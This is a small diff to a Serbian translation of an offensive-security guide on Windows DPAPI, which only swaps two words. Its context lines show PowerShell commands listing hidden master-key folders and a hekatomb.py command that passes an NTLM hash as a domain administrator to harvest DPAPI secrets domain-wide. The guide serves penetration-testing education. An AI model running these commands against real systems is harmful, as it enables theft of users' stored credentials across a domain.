@@ -60,7 +60,7 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-Ovo je kako će izgledati skup Master Keys korisnika:
+Ovo je kako će izgledati gomila Master Keys korisnika:
 
 ![](<../../images/image (1121).png>)
 
@@ -80,7 +80,7 @@ Pogledajte post [https://www.ired.team/offensive-security/credential-access-and-
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Sa listom računara ekstrahovanih iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste znali!
+Sa listom računara ekstraktovanih iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste znali!
 
 "Jer prava Domain Admin-a nisu dovoljna. Hakujte ih sve."
 
